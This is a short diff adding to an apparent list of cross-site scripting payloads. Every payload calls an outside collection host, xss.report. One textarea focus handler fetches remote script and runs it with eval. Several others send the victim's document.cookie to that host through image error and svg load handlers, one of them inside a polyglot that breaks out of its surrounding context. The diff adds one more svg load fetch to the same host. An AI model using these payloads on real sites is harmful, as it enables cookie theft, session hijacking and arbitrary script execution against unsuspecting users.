@@ -4,3 +4,4 @@
 <textarea onfocus="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Focus me</textarea>
 javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch('https://xss.report/c/hnterx?cookie='+document.cookie)/*--><html */ onmouseover=alert()//>
 <img src=x onerror=fetch('https://xss.report/c/hnterx?c='+document.cookie)>
+'"<svg/onload="fetch('https://xss.report/c/hnterx'">
